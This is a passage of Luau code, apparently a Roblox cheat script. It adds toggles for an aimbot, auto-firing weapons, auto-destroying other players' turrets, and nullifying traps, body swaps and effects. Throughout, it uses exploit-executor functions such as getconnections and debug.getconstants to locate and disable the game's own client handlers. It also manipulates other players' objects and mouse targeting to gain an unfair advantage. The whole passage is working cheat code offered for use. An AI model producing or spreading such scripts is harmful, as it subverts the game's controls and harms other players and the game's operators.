			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if humanoid and humanoid.Health > 0 and character_ then
				return character_
			end
			return nil
		end

		local function fn8()
			local character_ = localPlayer.Character
			return character_ and character_:FindFirstChild("Body Swap Potion") or localPlayer.Backpack:FindFirstChild("Body Swap Potion")
		end

		local function fn9(arg)
			if arg then
				local previousToolState = arg.PreviousToolStates[1]
				local bodySwapTool = arg.BodySwapTool

				if bodySwapTool and bodySwapTool.Parent then
					pcall(function()
						bodySwapTool:Deactivate()
						bodySwapTool.Enabled = true
						bodySwapTool.Parent = localPlayer.Backpack
					end)
				end

				for _, previousToolState2 in ipairs(arg.PreviousToolStates) do
					pcall(function()
						if previousToolState2.Tool.Parent then
							previousToolState2.Tool.Enabled = previousToolState2.Enabled

							if previousToolState2.Tool.Parent == character then
								previousToolState2.Tool.Parent = localPlayer.Backpack
							end
						end
					end)
				end

				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

				if not (not humanoid or humanoid.Health <= 0) then
					local tool = character_:FindFirstChildWhichIsA("Tool")

					if tool == bodySwapTool then
						pcall(function()
							bodySwapTool:Deactivate()
							bodySwapTool.Parent = localPlayer.Backpack
						end)

						tool = nil
					end

					if not tool and previousToolState and previousToolState.Tool.Parent == localPlayer.Backpack then
						pcall(function()
							runUntilTimeout(0.5)
							humanoid:EquipTool(previousToolState.Tool)
						end)
					end
				end
			end
		end

		local function fn10()
			local character_ = localPlayer.Character
			local v2 = fn8()
			if not v2 or not v2.Parent then
				return
			end

			pcall(function()
				v2:Deactivate()
				v2.Enabled = true

				if v2.Parent == character_ then
					v2.Parent = localPlayer.Backpack
				end
			end)
		end

		local v2, v3, v4, v5, v6, v7

		local function fn11()
		end

		fn6 = function()
			position = nil
			table.clear(playerMap)
			n8 = 0
		end

		local function fn12(deltaTime)
			if localPlayer:GetAttribute("Stealing") == true then
				n9 = os.clock() + n6
			end

			n8 += deltaTime

			if not (n8 < n3) then
				n8 = 0
				local v8 = fn7(localPlayer)
				if not v8 then
					fn6()
					return
				end
				local position2 = v8.Position

				if position and not flag3 then
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= localPlayer then
							local v9 = fn7(player)
							local playerEntry = playerMap[player]

							if v9 and playerEntry then
								local position3 = v9.Position
								if (position2 - position).Magnitude >= n4 and (position3 - playerEntry).Magnitude >= n4 and (position2 - playerEntry).Magnitude <= n5 and (position3 - position).Magnitude <= n5 then
									fn11(position, player, localPlayer:GetAttribute("Stealing") == true or os.clock() <= n9)
									break
								end
							end
						end
					end
				end

				position = position2

				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer then
						local v9 = fn7(player)
						playerMap[player] = v9 and v9.Position or nil
					end
				end
			end
		end

		local function fn13()
			local v8 = v
			v = nil
			flag2 = false
			flag3 = false
			n7 += 1
			fn9(v8)
			fn10()
			fn6()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function fn14()
			fn13()
			flag2 = true
			fn6()
			local bodySwapPotion, v8 = fn3("Body Swap Potion")

			if not bodySwapPotion then
				fn4("Body Swap Potion", v8)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n7 += 1
				local v9 = v
				v = nil
				fn9(v9)
				flag3 = false
				fn6()
				task.defer(fn10)
			end)

			connection3 = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
				if localPlayer:GetAttribute("Stealing") == true then
					n9 = os.clock() + n6
				end
			end)

			if localPlayer:GetAttribute("Stealing") == true then
				n9 = os.clock() + n6
			end

			connection = RunService.Heartbeat:Connect(fn12)
			return true
		end

		fn(fn13)

		helperSection:CreateToggle({
			Name = "Anti Body Swap",
			Default = true,
			Callback = function(arg)
				if arg then
					fn14()
				else
					fn13()
				end
			end,
		})
	end

	do
		local flag2 = false
		local connections = {}
		local connections2 = {}
		local connections3 = {}
		local weakCache2 = setmetatable({}, { __mode = "k" })
		local weakCache3 = setmetatable({}, { __mode = "k" })
		local weakCache4 = setmetatable({}, { __mode = "k" })
		local weakCache5 = setmetatable({}, { __mode = "k" })
		local weakCache6 = setmetatable({}, { __mode = "k" })
		local v = nil
		local v2 = nil
		local v3 = nil
		local v4 = nil
		local n3 = 0
		local n4 = 0
		local currentCamera = nil
		local humanoid = nil
		local flag3 = false
		local fieldOfView = 70
		local vector3Zero = Vector3.zero
		local enabledFlags = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true }
		local destroyAll = nil
		local fn6 = nil

		local function disconnectAll(arg)
			for _, v5 in ipairs(arg) do
				if typeof(v5) == "RBXScriptConnection" then
					v5:Disconnect()
				end
			end

			table.clear(arg)
		end

		local fn7 = nil

		fn7 = function(arg, arg2, arg3)
			if not (typeof(arg) ~= "function" or arg2 > 3 or arg3[arg]) then
				arg3[arg] = true
				local ok, result = pcall(debug.getconstants, arg)
				local flag4 = false
				local flag5 = false
				local flag6 = false

				if ok then
					for _, v5 in ipairs(result) do
						if type(v5) == "string" then
							local str = string.lower(v5)

							if string.find(str, "discoeffect", 1, true) then
								flag5 = true
							end

							if string.find(str, "boogie", 1, true) then
								flag4 = true
							end

							if str == "fieldofview" then
								flag6 = true
							end
						end
					end
				end

				if not (flag5 and (flag4 or flag6)) then
					local ok2, result2 = pcall(debug.getprotos, arg)

					if ok2 then
						for _, v5 in ipairs(result2) do
							if fn7(v5, arg2 + 1, arg3) then
								return true
							end
						end
					end

					return false
				end

				return true
			end

			return false
		end

		local function fn8(arg)
			local enabled = nil

			return pcall(function()
				enabled = arg.Enabled
			end) and enabled == true
		end

		local function fn9(arg)
			if typeof(arg) ~= "function" then
				return false
			end
			local ok, result = pcall(debug.info, arg, "s")
			return ok and type(result) == "string" and string.find(string.lower(result), "paintballguncontroller", 1, true) ~= nil
		end

		local function fn10(arg)
			if flag and fn8(arg) and pcall(function()
				arg:Disable()
			end) then
				weakCache5[arg] = true
			end
		end

		local function fn11(arg)
			if not (not flag or not arg or not arg.Parent or not arg:IsA("RemoteEvent")) then
				local ok, result = pcall(getconnections, arg.OnClientEvent)

				if ok then
					for _, v5 in ipairs(result) do
						if not weakCache6[v5] then
							weakCache6[v5] = true
							local function_ = nil

							pcall(function()
								function_ = v5.Function
							end)

							if fn7(function_, 1, {}) or fn9(function_) then
								weakCache4[v5] = true
								fn10(v5)
							end
						end
					end
				end
			end
		end

		local function fn12()
			n4 += 1
			local n42 = n4

			task.spawn(function()
				local list = { { Object = Lighting, Kind = "Lighting" }, { Object = ReplicatedStorage, Kind = "Remotes" } }
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

				if playerScripts then
					list[#list + 1] = { Object = playerScripts, Kind = "Sounds" }
				end

				local n5 = 1

				while flag and n4 == n42 and n5 <= #list do
					local now = os.clock()
					local n6 = 0

					while true do
						local v5 = list[n5]
						n5 += 1
						local object = v5.Object

						if object and object.Parent then
							if v5.Kind == "Lighting" then
								destroyAll(object)
							elseif v5.Kind == "Sounds" then
								fn6(object)
							elseif v5.Kind == "Remotes" and object:IsA("RemoteEvent") then
								fn11(object)
							end

							local tbl3 = {}

							pcall(function()
								tbl3 = object:GetChildren()
							end)

							for _, v6 in ipairs(tbl3) do
								list[#list + 1] = { Object = v6, Kind = v5.Kind }
							end
						end

						n6 += 1
						if not (n5 > #list or n6 >= 20 or os.clock() - now >= 0.0015) then
							continue
						end
						break
					end

					if not (n5 <= #list) then
						continue
					end
					RunService.Heartbeat:Wait()
				end
			end)
		end

		local function fn13()
			for k in pairs(weakCache5) do
				pcall(function()
					if not k.Enabled then
						k:Enable()
					end
				end)
			end

			table.clear(weakCache5)
			table.clear(weakCache4)
			table.clear(weakCache6)
		end

		destroyAll = function(arg)
			if arg and arg.Parent and enabledFlags[arg.Name] then
				pcall(function()
					arg:Destroy()
				end)
			end
		end

		local function fn14()
			return localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		fn6 = function(arg)
			if not (not arg or not arg:IsA("Sound") or arg.Name ~= "Buzzing") then
				if weakCache3[arg] == nil then
					weakCache3[arg] = arg.Volume
				end

				local flag4 = false

				local function fn15()
					if flag4 or not flag2 or not arg.Parent then
						return
					end
					flag4 = true

					pcall(function()
						if arg.Playing then
							arg:Stop()
						end

						if arg.Volume ~= 0 then
							arg.Volume = 0
						end
					end)

					flag4 = false
				end

				fn15()

				if not weakCache2[arg] then
					weakCache2[arg] = true
					connections2[#connections2 + 1] = arg:GetPropertyChangedSignal("Volume"):Connect(fn15)
					connections2[#connections2 + 1] = arg:GetPropertyChangedSignal("Playing"):Connect(fn15)
					return
				end
			end
		end

		local function fn15()
			if flag3 or not flag2 then
				return
			end
			flag3 = true

			pcall(function()
				if currentCamera and currentCamera.Parent and currentCamera.FieldOfView ~= fieldOfView then
					currentCamera.FieldOfView = fieldOfView
				end

				if humanoid and humanoid.Parent and humanoid.CameraOffset ~= vector3Zero then
					humanoid.CameraOffset = vector3Zero
				end
			end)

			flag3 = false
		end

		local function fn16()
			disconnectAll(connections3)
			currentCamera = Workspace.CurrentCamera
			local character_ = localPlayer.Character
			humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			fn15()

			if currentCamera then
				connections3[#connections3 + 1] = currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(fn15)
			end

			if humanoid then
				connections3[#connections3 + 1] = humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(fn15)
			end
		end

		local function fn17()
			disconnectAll(connections3)
			currentCamera = nil
			humanoid = nil
			flag3 = false
		end

		local function fn18()
			pcall(function()
				v.moveFunction = v3
			end)

			v = nil
			v2 = nil
			v3 = nil
			v4 = nil
		end

		local function fn19()
			if v.moveFunction ~= v4 then
				v.moveFunction = v4
			end
		end

		local function fn20()
			disconnectAll(connections2)

			for k, v5 in pairs(weakCache3) do
				if k and k.Parent then
					pcall(function()
						k.Volume = v5
					end)
				end
			end

			table.clear(weakCache2)
			table.clear(weakCache3)
		end

		local function fn21()
			flag2 = false
			n3 += 1
			n4 += 1
			disconnectAll(connections)
			fn13()
			fn17()
			fn18()
			fn20()
		end

		local function fn22()
			fn21()
			flag2 = true
			n3 += 1
			local n32 = n3
			fn19()
			fn16()
			fn12()

			connections[#connections + 1] = Lighting.DescendantAdded:Connect(function(descendant)
				if flag2 then
					destroyAll(descendant)
				end
			end)

			connections[#connections + 1] = ReplicatedStorage.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("RemoteEvent") then
					task.defer(function()
						fn11(descendant)
					end)

					task.delay(0.5, function()
						fn11(descendant)
					end)
				end
			end)

			local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

			if playerScripts then
				connections[#connections + 1] = playerScripts.DescendantAdded:Connect(function(descendant)
					if flag2 then
						fn6(descendant)
					end
				end)
			end

			connections[#connections + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				if flag2 then
					fn16()
				end
			end)

			connections[#connections + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("Humanoid", 5)

					if flag2 and character_ == localPlayer.Character then
						fn16()
					end
				end)
			end)

			task.spawn(function()
				while true do
					if flag2 and flag and n3 == n32 then
						task.wait(0.1)

						if not (not flag2 or not flag or n3 ~= n32) then
							if not fn14() then
								fn19()
								continue
							end
							continue
						end
					end

					break
				end
			end)
		end

		fn(fn21)

		helperSection:CreateToggle({
			Name = "Anti Bee, Disco & Paintball Effect",
			Default = true,
			Callback = function(arg)
				if arg then
					fn22()
				else
					fn21()
				end
			end,
		})
	end

	do
		local n3 = 1.06
		local vector = Vector3.new(2.9, 1.15, 2.9)
		local color = Color3.fromRGB(255, 45, 45)
		local lineThickness = 0.03
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local tbl3 = {}

		local function isModel(arg)
			return arg:IsA("Model") and arg.Name:match("^Trap") ~= nil
		end

		local function fn6(arg, arg2)
			local v = arg:FindFirstChild(arg2)
			if v and v:IsA("BasePart") then
				return v
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant.Name == arg2 and descendant:IsA("BasePart") then
					return descendant
				end
			end

			return nil
		end

		local function fn7(arg)
			local v = tbl3[arg]

			if v then
				tbl3[arg] = nil

				if v.Connection then
					pcall(function()
						v.Connection:Disconnect()
					end)
				end

				for _, propertyConnection in ipairs(v.PropertyConnections) do
					pcall(function()
						propertyConnection:Disconnect()
					end)
				end

				table.clear(v.PropertyConnections)

				if v.Outline then
					pcall(function()
						v.Outline:Destroy()
					end)
				end

				if v.Target and v.Target.Parent then
					pcall(function()
						v.Target.Size = v.OriginalSize
						v.Target.CFrame = v.OriginalCFrame
						v.Target.CanCollide = v.OriginalCanCollide
						v.Target.CanTouch = v.OriginalCanTouch
					end)
				end
			end
		end

		local function fn8()
			for k in pairs(tbl3) do
				fn7(k)
			end

			table.clear(tbl3)
		end

		local function fn9(arg, arg2)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ then
				return false
			end
			local vector2 = arg:PointToObjectSpace(character_.Position)
			local vector3 = arg2 * 0.5
			local x = vector3.X
			local flag3 = math.abs(vector2.X) <= x

			if flag3 then
				local y = vector3.Y
				flag3 = math.abs(vector2.Y) <= y
			end

			if flag3 then
				local z = vector3.Z
				flag3 = math.abs(vector2.Z) <= z
			end

			return flag3
		end

		local function fn10(arg)
			if not tbl3[arg] then
				local open = fn6(arg, "Open")
				local close = fn6(arg, "Close")

				if not (not open or not close) then
					local boundsCFrame, boundsSize = arg:GetBoundingBox()
					local vector2 = boundsSize * n3 + vector
					local n4 = math.max(vector2.X, vector2.Z)
					local vector3 = Vector3.new(n4, vector2.Y, n4)

					if not fn9(open.CFrame, vector3) then
						local tbl4 = {
							Target = close,
							OriginalSize = close.Size,
							OriginalCFrame = close.CFrame,
							OriginalCanCollide = close.CanCollide,
							OriginalCanTouch = close.CanTouch,
							PropertyConnections = {},
						}

						tbl3[arg] = tbl4
						local flag3 = false

						local function fn11()
							if flag3 or not flag2 or not close.Parent or not open.Parent then
								return
							end
							flag3 = true

							pcall(function()
								close.Size = vector3
								close.CFrame = open.CFrame
								close.CanCollide = true
								close.CanTouch = false
							end)

							flag3 = false
						end

						fn11()
						tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("Size"):Connect(fn11)
						tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CFrame"):Connect(fn11)
						tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanCollide"):Connect(fn11)
						tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanTouch"):Connect(fn11)
						tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = open:GetPropertyChangedSignal("CFrame"):Connect(fn11)
						local selectionBox = Instance.new("SelectionBox")
						selectionBox.Name = generateRandomId()
						selectionBox.Adornee = close
						selectionBox.Archivable = false
						selectionBox.Color3 = color
						selectionBox.LineThickness = lineThickness
						selectionBox.SurfaceTransparency = 1
						selectionBox.Transparency = 0
						selectionBox.Parent = close
						tbl4.Outline = selectionBox

						tbl4.Connection = arg.AncestryChanged:Connect(function(child, parent)
							if not parent then
								fn7(arg)
							end
						end)

						return
					end
				end
			end
		end

		local function fn11()
			for _, child in ipairs(Workspace:GetChildren()) do
				if isModel(child) then
					fn10(child)
				end
			end
		end

		local function fn12()
			flag2 = false
			connection2:Disconnect()
			connection2 = nil
			connection:Disconnect()
			connection = nil
			fn8()
		end

		local function fn13()
			fn12()
			flag2 = true
			fn11()

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if not flag2 or not isModel(child) then
					return
				end

				task.defer(function()
					if flag2 and child.Parent then
						fn10(child)
					end
				end)
			end)

			connection = localPlayer.CharacterAdded:Connect(function()
				if flag2 then
					task.defer(fn11)
				end
			end)
		end

		fn(fn12)

		helperSection:CreateToggle({
			Name = "Anti Trap",
			Default = true,
			Callback = function(arg)
				if arg then
					fn13()
				else
					fn12()
				end
			end,
		})
	end

	do
		local flag2 = false
		local n3 = 0
		local connection = nil
		local kMap = {}
		local tbl3 = {}
		local v = nil
		local v2 = nil
		local n4 = 0
		local str = "Sentry_" .. tostring(localPlayer.UserId)

		local function fn6(arg)
			local isModel

			if arg then
				isModel = arg:IsA("Model") or arg:IsA("BasePart")
			else
				isModel = arg
			end

			return isModel and arg.Name:match("^Sentry_") ~= nil and arg.Name ~= str
		end

		local function fn7(arg)
			if arg:IsA("BasePart") then
				return arg
			end
			return arg:FindFirstChildWhichIsA("BasePart", true)
		end

		local function fn8(arg)
			return arg:FindFirstChild("SetupReady", true) ~= nil
		end

		local function fn9(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")
			if arg and arg.Name:lower():find("bat", 1, true) then
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
						return child
					end
				end

				return nil
			end

			return s4
		end

		local function fn10()
			local v3 = v
			local v22 = v2
			v = nil
			v2 = nil

			if v3.Parent then
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				if not (not character_ or not humanoid or humanoid.Health <= 0 or v3.Parent ~= character_ and v3.Parent ~= backpack) then
					local tool = character_:FindFirstChildWhichIsA("Tool")

					if tool ~= v3 and not (tool and tool ~= v22) then
						pcall(function()
							runUntilTimeout(0.5)
							humanoid:EquipTool(v3)
						end)

						return
					end
				end
			end
		end

		local function fn11()
			return localPlayer:GetAttribute("Stealing") == true or localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		local function fn12(arg)
			if not tbl3[arg] then
				tbl3[arg] = { CanCollide = arg.CanCollide, Transparency = arg.Transparency, Size = arg.Size }
			end

			arg.CanCollide = false
			arg.Transparency = 1
			arg.Size = Vector3.new(10, 10, 10)
		end

		local function fn13()
			for k, v3 in pairs(tbl3) do
				if k and k.Parent then
					pcall(function()
						k.CanCollide = v3.CanCollide
						k.Transparency = v3.Transparency
						k.Size = v3.Size
					end)
				end
			end

			tbl3 = {}
		end

		local function fn14()
			if not fn11() then
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

				if not (not humanoid or humanoid.Health <= 0 or not humanoidRootPart) then
					local v3 = nil
					local huge = math.huge
					local k = nil

					for k2 in pairs(kMap) do
						if not k2.Parent then
							kMap[k2] = nil
						elseif fn8(k2) then
							local v4 = fn7(k2)

							if v4 then
								local magnitude = (humanoidRootPart.Position - v4.Position).Magnitude

								if magnitude < huge then
									v3 = v4
									huge = magnitude
									k = k2
								end
							end
						end
					end

					if not (not k or not k.Parent or not v3 or not v3.Parent) then
						pcall(function()
							fn12(v3)
							v3.CFrame = humanoidRootPart.CFrame
						end)

						local v4 = fn9(character_)

						if v4 then
							if v4.Parent ~= character_ then
								local tool = character_:FindFirstChildWhichIsA("Tool")

								if tool and tool ~= v4 then
								end

								v2 = v4

								pcall(function()
									runUntilTimeout(1)
									humanoid:EquipTool(v4)
								end)
							end

							if v4.Parent == character_ then
								n4 = os.clock()

								pcall(function()
									v4:Activate()
								end)
							end
						end
					end
				end
			end
		end

		local function fn15()
			flag2 = false
			n3 += 1
			n4 = 0
			fn10()
			connection:Disconnect()
			connection = nil
			kMap = {}
			fn13()
		end

		local function fn16()
			fn15()
			flag2 = true
			n3 += 1
			local n32 = n3

			for _, descendant in ipairs(Workspace:GetDescendants()) do
				if fn6(descendant) then
					kMap[descendant] = true
				end
			end

			connection = Workspace.DescendantAdded:Connect(function(descendant)
				if flag2 and fn6(descendant) then
					kMap[descendant] = true
				end
			end)

			fn14()

			task.spawn(function()
				local n42 = n4

				while flag2 and n3 == n32 and flag do
					if not fn11() then
						local character_ = localPlayer.Character
						local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

						if humanoid and humanoid.Health > 0 and humanoidRootPart then
							local v3 = nil
							local huge = math.huge
							local k = nil

							for k2 in pairs(kMap) do
								if not k2.Parent then
									kMap[k2] = nil
								elseif fn8(k2) then
									local v4 = fn7(k2)

									if v4 then
										local magnitude = (humanoidRootPart.Position - v4.Position).Magnitude

										if magnitude < huge then
											v3 = v4
											huge = magnitude
											k = k2
										end
									end
								end
							end

							if k and k.Parent and v3 and v3.Parent then
								pcall(function()
									fn12(v3)
									v3.CFrame = humanoidRootPart.CFrame
								end)

								local now = os.clock()

								if now - n42 >= 0.01 then
									local v4 = fn9(character_)

									if v4 then
										if v4.Parent ~= character_ then
											local tool = character_:FindFirstChildWhichIsA("Tool")

											if tool and tool ~= v4 then
											end

											v2 = v4

											pcall(function()
												runUntilTimeout(1)
												humanoid:EquipTool(v4)
											end)
										end

										if v4.Parent == character_ then
											pcall(function()
												v4:Activate()
											end)
										end
									end

									n42 = now
								end
							else
								fn10()
							end
						end
					else
						fn10()
					end

					task.wait()
				end
			end)
		end

		fn(fn15)

		helperSection:CreateToggle({
			Name = "Auto Destroy Turrets",
			Default = true,
			Callback = function(arg)
				if arg then
					fn16()
				else
					fn15()
				end
			end,
		})
	end

	do
		local v, v2, v3, v4, v5, v6, v7

		helperSection:CreateButton({
			Name = "Instant Clone Swap",
			ButtonText = "Swap",
			Callback = function()
				return false
			end,
		})
	end

	do
		local n3 = 0.05
		local n4 = 0.05
		local n5 = 200

		local gunFlags = {
			["Web Slinger"] = true,
			["Taser Gun"] = true,
			["Laser Cape"] = true,
			["Paintball Gun"] = true,
		}

		local PlayerMouse = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("PlayerMouse"))
		local flag2 = false
		local flag3 = false
		local n6 = 0
		local flag4 = false
		local n7 = 0
		local flag5 = false
		local hit = nil
		local target = nil
		local v = nil
		local n8 = 0
		local n9 = 0
		local n10 = 0
		local weakCache2 = setmetatable({}, { __mode = "k" })
		local connection = nil

		local function fn6()
			if flag5 then
				return
			end
			flag5 = true
			hit = PlayerMouse.Hit
			target = PlayerMouse.Target
		end

		local function fn7(arg)
			local character_ = arg.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso") or character_:FindFirstChild("Torso")
			end

			if humanoid and humanoid.Health > 0 and character_ then
				return humanoid, character_
			end
		end

		local function fn8()
			local character_ = localPlayer.Character
			if not character_ then
				return nil
			end

			for k in pairs(gunFlags) do
				local v2 = character_:FindFirstChild(k)
				if v2 and v2:IsA("Tool") then
					return v2
				end
			end
		end

		local function fn9()
			local v2, v3 = fn7(localPlayer)
			if not v3 then
				return nil
			end
			local magnitude = nil
			local v4 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v5, v6 = fn7(player)

					if v6 then
						local magnitude2 = (v6.Position - v3.Position).Magnitude

						if not magnitude or magnitude2 < magnitude then
							magnitude = magnitude2
							v4 = v6
						end
					end
				end
			end

			return v4
		end

		local function fn10(arg)
			local now = os.clock()

			if arg or not v or not v.Parent or now - n8 >= n3 then
				n8 = now
				v = fn9()
			end

			return v
		end

		local function fn11(arg)
			local muzzle = weakCache2[arg]

			if not muzzle or not muzzle.Parent then
				muzzle = arg:FindFirstChild("Muzzle", true) or arg:FindFirstChild("FirePoint", true) or arg:FindFirstChild("Handle")
				weakCache2[arg] = muzzle
			end

			if muzzle then
				if muzzle:IsA("Attachment") then
					return muzzle.WorldPosition
				end

				if muzzle:IsA("BasePart") then
					return muzzle.Position
				end
			end

			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			return character_ and character_.Position
		end

		local function fn12()
			local now = os.clock()

			if not (now < n10) then
				n10 = now + 0.5

				local ok, result = pcall(function()
					return localPlayer:GetNetworkPing()
				end)

				if ok and type(result) == "number" then
					n9 = math.clamp(result, 0, 0.35)
				end
			end

			return n9
		end

		local function fn13(arg, arg2)
			local n11 = n5 * n5
			local n12 = arg2:Dot(arg2) - n11
			local n13 = 2 * arg:Dot(arg2)
			local v2 = arg:Dot(arg)
			local n14

			if math.abs(n12) < 0.0001 then
				n14 = nil

				if math.abs(n13) > 0.0001 then
					n14 = -v2 / n13
					local v3 = nil

					if not (n14 > 0) then
						n14 = v3
					end
				end
			else
				local n15 = n13 * n13 - 4 * n12 * v2
				n14 = nil

				if n15 >= 0 then
					local n16 = math.sqrt(n15)
					local n17 = (-n13 - n16) / 2 * n12
					local n18 = (-n13 + n16) / 2 * n12

					if n17 > 0 and n18 > 0 then
						n14 = math.min(n17, n18)
					elseif n17 > 0 then
						n14 = n17
					else
						n14 = nil

						if n18 > 0 then
							n14 = n18
						end
					end
				end
			end

			return math.clamp(n14 or arg.Magnitude / n5, 0, 3)
		end

		local function fn14(arg, arg2)
			local v2 = fn11(arg)
			if not v2 then
				return arg2.Position
			end
			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local n11 = arg2.Position + assemblyLinearVelocity * fn12()
			return n11 + assemblyLinearVelocity * fn13(n11 - v2, assemblyLinearVelocity)
		end

		local function fn15(arg)
			local v2 = fn8()

			if v2 then
				local v3 = fn10(arg)

				if v3 then
					local n11

					if v2.Name == "Paintball Gun" then
						n11 = fn14(v2, v3)
					else
						n11 = v3.Position + v3.AssemblyLinearVelocity * n4
					end

					PlayerMouse.Hit = CFrame.new(n11)
					PlayerMouse.Target = v3
					return true
				end
			end

			return false
		end

		local function cleanupRenderStep()
			flag2 = false
			ContextActionService:UnbindAction("ChilliToolAimbotAction")

			pcall(function()
				RunService:UnbindFromRenderStep("ChilliToolAimbotRender")
			end)

			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		local function fn16()
			cleanupRenderStep()
			flag2 = true

			ContextActionService:BindActionAtPriority("ChilliToolAimbotAction", function(arg, arg2)
				if arg2 == Enum.UserInputState.Begin and fn8() then
					fn15(true)
				end

				return Enum.ContextActionResult.Pass
			end, false, 10000, Enum.UserInputType.MouseButton1, Enum.UserInputType.Touch)

			connection = UserInputService.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch then
					fn15(true)
				end
			end)

			RunService:BindToRenderStep("ChilliToolAimbotRender", Enum.RenderPriority.Last.Value + 20, function()
				if fn8() then
					fn6()
					fn15(false)
				end
			end)
		end

		local function fn17()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Paintball Gun")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function fn18()
			flag3 = false
			n6 += 1
			local v2 = fn17()

			if v2 then
				pcall(function()
					v2:Deactivate()
				end)
			end
		end

		local function fn19()
			fn18()
			local paintballGun, v2 = fn3("Paintball Gun")

			if not paintballGun then
				fn4("Paintball Gun", v2)
			end

			flag3 = true
			n6 += 1
			local n62 = n6

			task.spawn(function()
				while flag3 and n62 == n6 and flag do
					local v3 = fn17()

					if v3 then
						fn6()

						if fn15(false) then
							pcall(function()
								v3:Activate()
							end)
						end
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		local function fn20()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Laser Cape")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function fn21()
			flag4 = false
			n7 += 1
			local v2 = fn20()

			if v2 then
				pcall(function()
					v2:Deactivate()
				end)
			end
		end

		local function fn22()
			fn21()
			local laserCape, v2 = fn3("Laser Cape")

			if not laserCape then
				fn4("Laser Cape", v2)
			end

			flag4 = true
			n7 += 1
			local n72 = n7

			task.spawn(function()
				while flag4 and n72 == n7 and flag do
					local v3 = fn20()

					if v3 then
						fn6()

						if fn15(false) then
							pcall(function()
								v3:Activate()
							end)
						end
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		fn(function()
			fn21()
			fn18()
			cleanupRenderStep()
		end)

		aimbotSection:CreateToggle({
			Name = "Aimbot",
			Default = true,
			Callback = function(arg)
				if arg then
					fn16()
				else
					cleanupRenderStep()
				end
			end,
		})

		aimbotSection:CreateToggle({
			Name = "Auto Paintball",
			Note = "Automatically uses the Paintball Gun while equipped.",
			Default = true,
			Callback = function(arg)
				if arg then
					fn19()
				else
					fn18()
				end
			end,
		})

		aimbotSection:CreateToggle({
			Name = "Auto Laser Cape",
			Note = "Automatically uses the Laser Cape while equipped.",
			Default = false,
			Callback = function(arg)
				if arg then
					fn22()
				else
					fn21()
				end
			end,
		})
	end

	local speedBoostSection
	speedBoostSection = playerTab:CreateSection({ Name = "Speed Boost" })
	local jumpBoostSection
	jumpBoostSection = playerTab:CreateSection({ Name = "Jump Boost" })
	characterSection = playerTab:CreateSection({ Name = "Character" })
	invisibilitySection = playerTab:CreateSection({ Name = "Invisibility" })
	respawnSection = playerTab:CreateSection({ Name = "Respawn", Expanded = false })

	do
		local n3 = 0.0083333333333333332
		local n4 = 4
		local n5 = 0.12
		local n6 = 25
		local n7 = 0.045
		local n8 = 0.03
		local n9 = 0.015
		local n10 = 10
		local n11 = 60
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local connection5 = nil
		local flag3 = false
		local humanoid = nil
		local humanoidRootPart = nil
		local flag4 = false
		local flag5 = false
